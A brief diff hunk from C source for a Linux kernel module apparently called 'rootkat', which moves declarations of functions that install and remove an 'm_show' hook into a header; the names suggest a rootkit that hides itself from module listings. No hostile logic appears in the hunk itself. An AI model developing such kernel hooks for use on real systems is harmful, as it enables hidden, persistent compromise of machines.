@@ -4,11 +4,9 @@
 #include <linux/init.h>
 #include "kallsyms.h"
 #include "resolver.h"
+#include "hook_m_show.h"
 
 #define ROOTKAT_TAG "rootkat: "
-
-extern int  rootkat_hook_m_show_install(void);
-extern void rootkat_hook_m_show_remove(void);
 
 static int __init rootkat_init(void)
 {
